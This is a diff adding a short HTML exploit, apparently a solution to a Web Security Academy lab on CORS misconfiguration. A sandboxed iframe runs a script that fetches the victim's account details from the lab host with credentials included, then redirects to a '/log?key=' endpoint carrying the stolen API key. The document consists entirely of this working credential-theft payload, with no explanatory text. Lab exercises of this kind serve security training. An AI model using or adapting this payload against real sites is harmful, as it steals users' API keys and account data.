@@ -1,0 +1,13 @@
+<iframe sandbox="allow-scripts"
+				srcdoc="
+<script>
+fetch('https://0aaf001203587b34801d533f00fc00b8.web-security-academy.net/accountDetails',{
+credentials: 'include'
+})
+.then(res => res.json())
+.then(data => {
+	location = '/log?key=' + encodeURIComponent(data.apikey);
+	});
+</script>
+">
+</iframe>
